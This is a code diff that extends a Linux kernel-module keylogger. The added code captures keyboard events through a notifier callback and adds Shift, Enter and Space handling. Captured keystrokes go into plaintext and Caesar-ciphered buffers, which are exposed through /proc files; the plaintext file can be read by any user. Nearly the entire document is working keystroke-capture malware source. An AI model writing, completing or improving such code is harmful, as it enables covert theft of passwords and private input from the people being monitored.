@@ -6,6 +6,7 @@
 #include <linux/proc_fs.h>
 #include <linux/wait.h>
 #include <linux/sched.h>
+#include <linux/slab.h> // For kzalloc and kfree
 
 #define BUFFER_SIZE 1024
 #define PROC_FILE_NAME "usb_keylogger"
@@ -15,8 +16,16 @@ MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Andy, Hugh, Skye");
 MODULE_DESCRIPTION("A simple Linux keylogger with /proc interface");
 
-static char key_buffer[BUFFER_SIZE];
-static char encrypted_buffer[BUFFER_SIZE];
+// Function prototype for keyboard_callback
+static int keyboard_callback(struct notifier_block *nblock, unsigned long action, void *data);
+
+// Declare the notifier_block structure
+static struct notifier_block nb = {
+    .notifier_call = keyboard_callback,
+};
+
+static char *key_buffer;
+static char *encrypted_buffer;
 static int buffer_pos = 0;
 static int encrypted_pos = 0;
 static struct proc_dir_entry *proc_entry;
@@ -25,13 +34,35 @@ static wait_queue_head_t read_queue;
 static wait_queue_head_t encrypted_queue;
 static int data_available = 0;
 static int encrypted_available = 0;
+static int shift_pressed = 0; // 1 if Shift is pressed, 0 otherwise
 
 // Function to map keycodes to characters
 static char keycode_to_char(int keycode) {
-    // Map raw keycodes to standard keycodes
-    if (keycode >= 64353 && keycode <= 64378) {
-        return 'a' + (keycode - 64353); // Map keycodes to 'a' to 'z'
+    // Handle Shift key (keycode 54)
+    if (keycode == 54) {
+        shift_pressed = 1; // Shift key is pressed
+        return '\0'; // Don't log the Shift key itself
     }
+
+    // Handle Enter key (keycode 28)
+    if (keycode == 28) {
+        return '\n'; // Return newline character for Enter
+    }
+
+    // Handle Space key (keycode 57)
+    if (keycode == 57) {
+        return ' '; // Return space character
+    }
+
+    // Map raw keycodes to standard keycodes (a-z)
+    if (keycode >= 64353 && keycode <= 64378) {
+        char base_char = 'a' + (keycode - 64353); // Map keycodes to 'a' to 'z'
+        if (shift_pressed) {
+            return base_char - 32; // Convert to uppercase if Shift is pressed
+        }
+        return base_char;
+    }
+
     return '\0'; // Unknown keycode
 }
 
@@ -98,33 +129,57 @@ static struct proc_ops proc_fops_encrypted = {
 static int keyboard_callback(struct notifier_block *nblock, unsigned long action, void *data) {
     struct keyboard_notifier_param *param = data;
 
-    if (action == KBD_KEYSYM && param->down) {
-        char key = keycode_to_char(param->value);
-        if (key != '\0' && buffer_pos < BUFFER_SIZE - 1) {
-            // Log the plaintext key
-            key_buffer[buffer_pos++] = key;
-            key_buffer[buffer_pos] = '\0'; // Null-terminate the buffer
-            data_available = 1;
-            wake_up_interruptible(&read_queue);
+    if (action == KBD_KEYSYM) {
+        if (param->down) {
+            char key = '\0';
 
-            // Encrypt the key and log it
-            caesar_cipher(&key, &encrypted_buffer[encrypted_pos], 1);
-            encrypted_pos++;
-            encrypted_buffer[encrypted_pos] = '\0'; // Null-terminate the buffer
-            encrypted_available = 1;
-            wake_up_interruptible(&encrypted_queue);
+            // Handle special keys directly
+            if (param->value == 28) { // Enter key
+                key = '\n';
+            } else if (param->value == 57) { // Space key
+                key = ' ';
+            } else if (param->value == 54) { // Shift key
+                shift_pressed = 1;
+            } else {
+                // Handle regular keys
+                key = keycode_to_char(param->value);
+            }
+
+            if (key != '\0' && buffer_pos < BUFFER_SIZE - 1) {
+                // Log the plaintext key
+                key_buffer[buffer_pos++] = key;
+                key_buffer[buffer_pos] = '\0'; // Null-terminate the buffer
+                data_available = 1;
+                wake_up_interruptible(&read_queue);
+
+                // Encrypt the key and log it
+                caesar_cipher(&key, &encrypted_buffer[encrypted_pos], 1);
+                encrypted_pos++;
+                encrypted_buffer[encrypted_pos] = '\0'; // Null-terminate the buffer
+                encrypted_available = 1;
+                wake_up_interruptible(&encrypted_queue);
+            }
+        } else {
+            // Handle key release
+            if (param->value == 54) { // Shift key
+                shift_pressed = 0;
+            }
         }
     }
 
     return NOTIFY_OK;
 }
 
-static struct notifier_block nb = {
-    .notifier_call = keyboard_callback
-};
-
 // Module initialization function
 static int __init keylogger_init(void) {
+    // Allocate memory for buffers
+    key_buffer = kzalloc(BUFFER_SIZE, GFP_KERNEL);
+    encrypted_buffer = kzalloc(BUFFER_SIZE, GFP_KERNEL);
+    if (!key_buffer || !encrypted_buffer) {
+        printk(KERN_ERR "Failed to allocate memory for buffers\n");
+        return -ENOMEM;
+    }
+
     // Initialize wait queues
     init_waitqueue_head(&read_queue);
     init_waitqueue_head(&encrypted_queue);
@@ -133,6 +188,8 @@ static int __init keylogger_init(void) {
     proc_entry = proc_create(PROC_FILE_NAME, 0444, NULL, &proc_fops);
     if (!proc_entry) {
         printk(KERN_ERR "Failed to create /proc/%s\n", PROC_FILE_NAME);
+        kfree(key_buffer);
+        kfree(encrypted_buffer);
         return -ENOMEM;
     }
 
@@ -140,6 +197,8 @@ static int __init keylogger_init(void) {
     if (!proc_entry_encrypted) {
         printk(KERN_ERR "Failed to create /proc/%s\n", PROC_FILE_ENCRYPTED);
         proc_remove(proc_entry); // Clean up the first /proc file if the second one fails
+        kfree(key_buffer);
+        kfree(encrypted_buffer);
         return -ENOMEM;
     }
 
@@ -164,6 +223,10 @@ static void __exit keylogger_exit(void) {
         proc_remove(proc_entry_encrypted);
         printk(KERN_INFO "Removed /proc/%s\n", PROC_FILE_ENCRYPTED);
     }
+
+    // Free allocated memory
+    kfree(key_buffer);
+    kfree(encrypted_buffer);
 
     printk(KERN_INFO "Keylogger module unloaded\n");
 }
